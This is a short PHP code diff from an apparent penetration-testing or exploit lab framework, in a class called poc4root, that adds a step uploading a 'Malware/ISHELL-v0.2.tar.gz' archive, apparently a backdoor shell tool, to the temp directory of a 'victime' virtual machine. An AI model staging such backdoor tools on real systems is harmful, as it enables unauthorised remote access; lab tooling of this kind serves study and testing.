@@ -156,6 +156,9 @@ class poc4root extends poc4bof {
         $vm = trim($vm);
         $this->titre(__FUNCTION__);
         
+        $victime = new vm($vm);
+        $victime->vm2upload("$this->dir_tools/Malware/ISHELL-v0.2.tar.gz","$this->vm_tmp_lin/ISHELL-v0.2.tar.gz");
+        
         $flag_poc = FALSE;
         $flag_poc = TRUE;
         
